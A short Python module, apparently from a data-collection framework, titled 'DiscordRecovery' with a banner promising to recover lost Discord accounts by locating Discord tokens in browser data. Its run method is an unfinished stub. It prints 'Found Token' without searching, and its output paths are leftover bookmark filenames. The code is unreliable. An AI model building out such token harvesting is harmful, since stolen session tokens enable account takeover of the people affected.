import os

from config import Constant
from config import ModuleManager


class DiscordRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name="DiscordRecovery")

        self.banner("""
     _______        
    |.-----.|       
    ||x . x||       
    ||_.-._||       
    `--)-(--`       
   __[=== o]___     
  |:::::::::::|\    
  `-=========-`()       Recover Lost Discord Accounts
                """)

        self.browsers_folder = os.path.join(
            self.output_folder_user, 'browsers')
        self.output_filename_csv = os.path.join(
            self.browsers_folder, 'browser_bookmarks_all.csv')
        self.output_filename_json = os.path.join(
            self.browsers_folder, 'browser_bookmarks_all.json')

        if not os.path.isdir(self.browsers_folder):
            os.makedirs(self.browsers_folder)

    def run(self):
        try:
            self.mdebug(
                "Looking for the token in")

            self.mprint("Found Token")
        except Exception as e:
            self.merror(
                f"Unable to locate any discord token: {e}. Skipping this module")
            return
